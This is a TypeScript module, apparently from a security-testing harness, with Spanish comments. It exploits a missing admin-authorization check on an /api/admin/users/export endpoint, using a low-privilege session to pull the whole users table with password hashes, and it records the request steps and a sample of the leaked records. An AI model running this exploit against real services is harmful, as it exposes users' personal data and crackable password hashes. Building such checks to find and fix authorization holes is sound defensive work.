/**
 * Ataque real: endpoint de admin sin authz. /api/admin/users/export usa
 * requireAuth pero le falta requireAdmin, así que cualquier usuario logueado
 * (incluso uno recién registrado) descarga toda la tabla users, con
 * password_hash incluido. Lo hacemos con una cuenta desechable de rol "user".
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../http.ts';
import { lowPrivSession, me } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../types.ts';

export const adminExport: Attack = {
  meta: CATALOG['admin-endpoint-no-authz'],
  mutating: false, // GET como usuario de baja privilegia (read-only)
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    const attacker = await lowPrivSession(ctx);
    const profile = await me(ctx, attacker.token);
    steps.push({
      technique: 'Sesión de usuario sin privilegios',
      request: reqLine('GET', '/api/users/me'),
      response_summary: `usuario de baja privilegia, role="${profile?.role}" (NO admin)`,
    });

    const res = await ctx.http.get('/api/admin/users/export', { token: attacker.token });
    const ok = res.status === 200 && Array.isArray(res.json);
    const rows = ok ? (res.json as unknown[]) : [];
    const hasHashes = ok && rows.some((r: any) => typeof r?.password_hash === 'string');

    steps.push({
      technique: 'Acceso directo al endpoint de export de admin',
      mitre: ['T1190', 'T1213'],
      request: reqLine('GET', '/api/admin/users/export'),
      response_summary: ok
        ? `HTTP 200 — ${rows.length} usuarios exportados${hasHashes ? ' CON password_hash' : ''}`
        : `HTTP ${res.status} — acceso denegado`,
      exchange: res.exchange,
      note: ok ? 'Un usuario sin rol admin descargó el respaldo completo: egreso de datos.' : undefined,
    });

    return {
      vuln_id: adminExport.meta.id,
      confirmed: ok,
      blocked: !ok,
      steps,
      gained: ok ? [`respaldo completo de usuarios (${rows.length})${hasHashes ? ', con hashes de contraseña' : ''}`] : [],
      foothold: ok ? { type: 'data', detail: 'tabla users completa' } : undefined,
      data_exfiltrated: ok
        ? {
            table: 'users',
            rows: rows.length,
            sample: rows.slice(0, 5).map((r: any) => ({
              id: r.id,
              email: r.email,
              role: r.role,
              password_hash: typeof r.password_hash === 'string' ? `${r.password_hash.slice(0, 7)}… <bcrypt, crackeable offline>` : undefined,
            })),
          }
        : undefined,
      attacker_active: false,
      summary: ok
        ? `BOLA/BFLA confirmado: un usuario sin privilegios descargó ${rows.length} usuarios${hasHashes ? ' con sus password_hash' : ''} vía /api/admin/users/export.`
        : 'El endpoint exigió autorización de admin: no es explotable.',
    };
  },
};
